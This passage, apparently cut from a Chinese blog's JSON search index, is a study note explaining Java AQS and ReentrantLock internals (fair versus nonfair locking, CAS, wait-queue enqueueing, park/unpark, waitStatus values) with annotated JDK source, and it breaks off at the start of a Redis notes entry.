class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span class=\"line\">        <span class=\"comment\">//拿到锁变量</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">        <span class=\"comment\">//c=0表示当前锁是空闲状态，可能刚被释放</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//hasQueuedPredecessors():返回没有等待的线程以及当前线程没有在工作</span></span><br><span class=\"line\">            <span class=\"comment\">//直接抢占，与lock方法类似，也是与非公平锁的唯一区别，非公平锁会先直接CAS抢占</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class=\"line\">                compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//没人等并且cas设值成功，锁归我了</span></span><br><span class=\"line\">                setExclusiveOwnerThread(current);</span><br><span class=\"line\">                <span class=\"comment\">//返回AQS的acquire方法，告诉他我拿到锁了，让别人去排队</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">            setState(nextc);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NonfairSync</span> <span class=\"keyword\">extends</span> <span class=\"title\">Sync</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> serialVersionUID = <span class=\"number\">7316153563782823691L</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//直接抢，抢到了就设置线程为当前线程，否则加入等待队列acquire(1);</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">            setExclusiveOwnerThread(Thread.currentThread());</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//AQS的acquire方法会调用tryAcquire，判断是否获取锁成功。tryAcquire是子类实现的模板</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">         <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span class=\"line\">        \t<span class=\"comment\">//拿到锁变量</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">        \t<span class=\"comment\">//c=0表示当前锁是空闲状态，可能刚被释放</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//直接抢占，与lock方法类似，也是与公平锁的唯一区别，公平锁会先判断等待队列是否为空</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">                    setExclusiveOwnerThread(current);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        \t<span class=\"comment\">//如果当前线程就是正在工作的线程</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>) <span class=\"comment\">// overflow</span></span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">                setState(nextc);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>1、为什么需要AQS? </p>\n<p>锁类型分为： </p>\n<p>​    1、互斥锁（独占锁）：同一时间只有一个线程能获取锁(ReentrantLock)</p>\n<p>​    2、共享锁：允许多个线程同时拿到锁（例如：读写锁ReadWriteLock读写锁，写锁和写锁、写锁和读锁互斥，读锁和 读锁可以共享) 这两个类都设计到线程的互斥问题，这就意味着总会有线程拿不到锁，那么这时为了避免的资源浪费（一直执行无关的 操作CAS),所以我们需要将线程阻塞，既然涉及到了线程阻塞操作，那么必然会有唤醒操作。所以我们需要： </p>\n<p>​    1、存放等待线程的数据结构：队列 </p>\n<p>​    2、操作线程阻塞和唤醒的方法：LockSupport类 </p>\n<p>​    3、表示当前锁的状态：state变量：0无锁、1有锁 </p>\n<p>所以AQS的出现就是对于互斥锁、共享锁的抽象：队列+state </p>\n<p>2、什么公平锁？什么是非公平锁 </p>\n<p>​    1、公平锁：FIFO先进先出)，根据AQS的排队的队列来看，是否有线程在排队，如果没有，那么抢锁，如果有那么排队先来后到 </p>\n<p>​    2、非公平锁：直接抢，管他有没有线程排队。抢不到就乖乖排队先来后到</p>\n<p>3、什么是抢锁？ AQS的实现有一个state变量，将其争夺修改为1，那么这种争夺的行为叫做抢锁</p>\n<p>4、怎么抢锁？抢锁的实现方式是什么？ CAS: Compare And Swap</p>\n</blockquote>\n<h2 id=\"源码追踪：\"><a href=\"#源码追踪：\" class=\"headerlink\" title=\"源码追踪：\"></a>源码追踪：</h2><h4 id=\"以非公平锁为例子\"><a href=\"#以非公平锁为例子\" class=\"headerlink\" title=\"以非公平锁为例子\"></a>以非公平锁为例子</h4><p>线程阻塞:底层调用LockSupport的park方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//ReentrantLock调用局部变量sync的lock方法，Sync有NonFairSync与FairSync两个实现类，默认是非公平</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    sync.lock();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//二话不说直接CAS抢锁，成功就设置工作线程为自己</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">        setExclusiveOwnerThread(Thread.currentThread());</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"comment\">//失败了加入等待队列</span></span><br><span class=\"line\">        acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">acquire</span><span class=\"params\">(<span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//再次尝试获取，失败了就才加入队列，同时阻塞线程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class=\"line\">        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class=\"line\">        selfInterrupt();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//模板方法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nonfairTryAcquire(acquires);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">nonfairTryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取锁的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">    <span class=\"comment\">//有人释放锁了！尝试获取</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//成功了，不用加入等待队列了</span></span><br><span class=\"line\">            setExclusiveOwnerThread(current);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//可重入</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>) <span class=\"comment\">// overflow</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        setState(nextc);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//获取失败，需要加入队列咯</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将线程实例化为Node并加入队列，本质为双向链表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Node <span class=\"title\">addWaiter</span><span class=\"params\">(Node mode)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//实例化</span></span><br><span class=\"line\">    Node node = <span class=\"keyword\">new</span> Node(Thread.currentThread(), mode);</span><br><span class=\"line\">    Node pred = tail;</span><br><span class=\"line\">    <span class=\"comment\">//队列已经初始化完（自己不是第一个来的）这个if是一个优化，与下面的enq方法部分类似，因为大多数情况已经初始化完了队列</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pred != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置新增节点的前驱为之前的尾部节点</span></span><br><span class=\"line\">        node.prev = pred;</span><br><span class=\"line\">        <span class=\"comment\">//CAS设置成功（如果tail节点还是等于pred的话，也就是说没有其他线程修改了那么更新尾部节点为node）</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//将尾部节点的后驱节点设置为新增节点</span></span><br><span class=\"line\">            pred.next = node;</span><br><span class=\"line\">            <span class=\"comment\">//添加完了，可以退出方法了  </span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    enq(node);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不断自旋直至将新增节点加到了队列</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Node <span class=\"title\">enq</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//死循环必定有分支</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取最新的tail</span></span><br><span class=\"line\">        Node t = tail;</span><br><span class=\"line\">        <span class=\"comment\">//为空意味着没有初始化</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">            <span class=\"comment\">//直接初始化并把节点放到头部</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetHead(<span class=\"keyword\">new</span> Node()))</span><br><span class=\"line\">                tail = head;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//该分支与上一个方法的if完全相同，只是为了提高效率</span></span><br><span class=\"line\">            node.prev = t;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class=\"line\">                t.next = node;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//该方法不断自旋直至获得锁或线程阻塞</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">acquireQueued</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node, <span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> failed = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> interrupted = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"comment\">//自旋直至获得锁或者阻塞</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获得当前节点的前驱节点</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> Node p = node.predecessor();</span><br><span class=\"line\">            <span class=\"comment\">//如果是头结点就开始尝试获得锁</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//获取成功了将当前节点设置为头节点                 </span></span><br><span class=\"line\">                setHead(node);</span><br><span class=\"line\">                <span class=\"comment\">//提高GC效率</span></span><br><span class=\"line\">                p.next = <span class=\"keyword\">null</span>; </span><br><span class=\"line\">                failed = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> interrupted;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//shouldParkAfterFailedAcquire方法：找到阻塞队列中没有线程中断的线程并把WaitStatus设置成Node.SIGNAL，值为-1。</span></span><br><span class=\"line\">            <span class=\"comment\">//parkAndCheckInterrupt方法：阻塞线程，唤醒后返回线程中断标志。若线程被中断了则会调用selfInterrupt()方法。</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                interrupted = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//从acquireQueued方法的无限循环跳转过来</span></span><br><span class=\"line\"><span class=\"comment\">//判断未添加新节点前的尾结点的waitStatus是否为signal（也就是-1），一般新添加的节点由于未初始化waitStatus为0</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">shouldParkAfterFailedAcquire</span><span class=\"params\">(Node pred, Node node)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ws = pred.waitStatus;</span><br><span class=\"line\">    <span class=\"comment\">//如果为Signal则返回true，第一次进来这个函数肯定是0（因为未初始化）</span></span><br><span class=\"line\">    <span class=\"comment\">//第二次进来由于是signal了，直接返回true开始阻塞（挂起）</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws == Node.SIGNAL)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       \t<span class=\"comment\">//循环到第一个waitStatus&gt;0的节点，也就是cancel的节点</span></span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            node.prev = pred = pred.prev;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (pred.waitStatus &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\">        pred.next = node;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//直接CAS将当前节点的waitStatus设为signal</span></span><br><span class=\"line\">        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过park阻塞</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">parkAndCheckInterrupt</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    LockSupport.park(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Thread.interrupted();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>线程唤醒：底层调用LockSupport的unPark方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    sync.release(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">release</span><span class=\"params\">(<span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取锁的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tryRelease(arg)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取头节点</span></span><br><span class=\"line\">        Node h = head;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h != <span class=\"keyword\">null</span> &amp;&amp; h.waitStatus != <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//唤醒head的线程</span></span><br><span class=\"line\">            unparkSuccessor(h);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryRelease</span><span class=\"params\">(<span class=\"keyword\">int</span> releases)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = getState() - releases;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalMonitorStateException();</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> free = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"comment\">//当前锁是空闲的</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        free = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"comment\">//设置当前工作线程为空</span></span><br><span class=\"line\">        setExclusiveOwnerThread(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setState(c);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> free;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//唤醒线程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">unparkSuccessor</span><span class=\"params\">(Node node)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ws = node.waitStatus;</span><br><span class=\"line\">    <span class=\"comment\">//ws小于0表示线程正在等待</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        compareAndSetWaitStatus(node, ws, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Node s = node.next;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"keyword\">null</span> || s.waitStatus &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        s = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">//从尾部开始遍历直到头节点，从尾节点遍历的原因是从头节点遍历会出现断链的情况。由于多线程的修改</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Node t = tail; t != <span class=\"keyword\">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (t.waitStatus &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                s = t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s != <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        <span class=\"comment\">//通过LockSupport工具类唤醒线程，底层通过Unsafe调用native方法实现唤醒</span></span><br><span class=\"line\">        LockSupport.unpark(s.thread);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<p>对于AQS的state的一些理解</p>\n<p>先来看一段reentrantlock中的公平锁代码 int c = getState();进来先获取state的状态信息，若c==0则表示当前锁没有被线程持有，进入下一步，因为是公平锁，所以线程在尝试获取锁时需要判断当前等待队列里面是否已经有线程在等待了，若是有的话，当前线程就不会去尝试获取锁，<br>若是当前锁已经被线程持有了，即c ！= 0，那么会比较当前线程和持有锁线程的关系，即判断当前是否是持有锁的线程又一次来尝试获取锁，这也是reentrantlock是可重入锁的原因，在current == getExclusiveOwnerThread()时，会将state+1，并且返回true，而对应的在释放锁的时候，肯定也是需要释放多次的<br>这是互斥锁的state变化，也就是为0代表没有被线程持有，不为0的话就代表是一个线程获取了几次这个锁，也就是重入了几次<br>而aqs还有一个锁的实现方式，就是共享锁，juc包下面的读锁就是共享锁，共享锁的state则是一个类似资源数的量，假如state初始为3，那么就可以有三个线程来同时获取锁</p>\n<p>对于Node的state的一些理解</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//表示线程获取锁的请求已取消</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> CANCELLED = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示线程已准备好正等待唤醒</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> SIGNAL = -<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示线程在队列中等待获取同步锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> CONDITION = -<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示共享模式下无条件传播，共享锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> PROPAGATE = -<span class=\"number\">3</span>;</span><br></pre></td></tr></table></figure>\n\n<p>注意，<strong>负值表示结点处于有效等待状态，而正值表示结点已被取消。所以源码中很多地方用&gt;0、&lt;0来判断结点的状态是否正常</strong>。</p>\n<blockquote>\n<p>​    对于CAS的一些理解</p>\n<p>一般都通过自旋实现，对于双向链表，一般会维护一个tail变量提高尾插的效率。对于高并发插入操作，此时竞争点在tail上。先将需要新增的节点的前驱节点指向tail节点，然后自旋CAS判断尾部是否为之前获取到的，如果是就修改尾部为新增节点，否则继续循环获取CAS锁。</p>\n<p>以上代码为AQS阻塞线程及线程被唤醒后执行逻辑。在调用该方法之前线程已经被封装到Node对象并添加到阻塞队列（位于队列尾部tail）。</p>\n</blockquote>\n<blockquote>\n<p>我们看到第二个if，shouldParkAfterFailedAcquire(p, node)方法通过设置前置节点Node的waitstatus或者清除失效节点来实现至少一次的“自旋”操作。代码如下，在第一次进入该方法时前置节点pred为原来的tail尾节点，此时pred的waitestatus为0或1（超时失效） 以至于在该方法中线程需要修改waistatus的值或者清除失效节点，从而实现短暂的“自旋”。即第一次进入 shouldParkAfterFailedAcquire(p, node)方法时，第二个if必定被短路而进入下一次循环，而如果此时当前线程节点的前置节点为head节点，线程再一次进入第一个if，此时线程未被挂起，从新尝试去获取一次锁（请求信号量）。 如果第二次循环中pred节点不是head节点，或者请求锁失败，线程第二次进入第二个if，此时pred节点waitstatus必定小于0 ，若为-1（Node.SIGNAL）则返回true调用 parkAndCheckInterrupt()将线程挂起否则则修改waitsatus的值重新进入循环体。</p>\n<p>因此我们可以看到，AQS通过shouldParkAfterFailedAcquire(p, node)方法保证在挂起线程之前至少1次的”自旋”并在”自旋”前后尝试去占有锁（请求信号量）。即AQS的阻塞策略为通过至少1次“自旋“来多次尝试获取锁如果失败则将线程挂起。那么为什么Doug Lea要如此设计呢？</p>\n</blockquote>\n<p>自旋等待与挂起两种方式的效率高低取决于上下文切换的开销以及成功获取锁之前需要等待的时间，如果等待时间短则适合使用自旋锁，如果等待时间长则适合使用挂起操作。—《Java并发编程实践》</p>\n<p>我们都知道挂起和唤醒一个线程将会带来上下文切换的开销，而如果在一个低并发的环境下，线程频繁的挂起和唤醒将消耗大量的系统资源，与CUP密集型程序发生大量的上下文切换，从而增加调度开销降低吞吐量。因此在低并发的环境下（线程等待时间较短）通过自旋等待将可以完全避免上下文切换带来的系统开销。</p>\n<p>然而，自旋等待会使阻塞线程与其他线程竞争CUP的时间片，占有cup资源，尽管这种开销是很小的，但是当大量的线程长时间的去竞争CUP的时间片将给操作系统带来毁灭性的灾难。有些事情如果我们不把它推向极端，我们是不会知道有多荒谬。同样的我们只有在一个极端条件下，才能发现多线程长时间自旋等待的危害。</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://blog.csdn.net/lppzyt/article/details/106743809\">https://blog.csdn.net/lppzyt/article/details/106743809</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/114257735\">https://zhuanlan.zhihu.com/p/114257735</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41977838/article/details/106578717\">https://blog.csdn.net/qq_41977838/article/details/106578717</a></p>\n<p><a href=\"https://blog.csdn.net/qq_28275283/article/details/76697120\">https://blog.csdn.net/qq_28275283/article/details/76697120</a></p>\n","categories":["java"]},{"title":"Redis笔记","url":"/p/65035/","content":"<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607111504594.png\" alt=\"image-20220607111504594\"></p>\n<h2 id=\"NoSQL数据库\"><a href=\"#NoSQL数据库\" class=\"headerlink\" title=\"NoSQL数据库\"></a>NoSQL数据库</h2><h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" 